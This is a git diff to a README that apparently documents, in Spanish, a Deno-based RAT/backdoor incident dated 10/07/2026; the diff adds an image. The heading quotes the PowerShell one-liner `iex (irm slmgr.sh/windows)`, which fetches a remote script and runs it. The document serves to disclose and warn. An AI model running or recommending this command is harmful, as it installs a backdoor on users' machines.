@@ -1,5 +1,8 @@
 # deno-backdoor-slmgr-sh-windows-incident
 
+<img width="351" height="586" alt="image" src="https://github.com/user-attachments/assets/bfcbfb62-f5a2-43f3-aacb-a5c61ba4642b" />
+
+
 incidente y declaración para evidenciar el malware existente fechado en 10/07/2026
 
 # Incidente de malware usando `iex (irm slmgr.sh/windows)` – Deno RAT / Backdoor
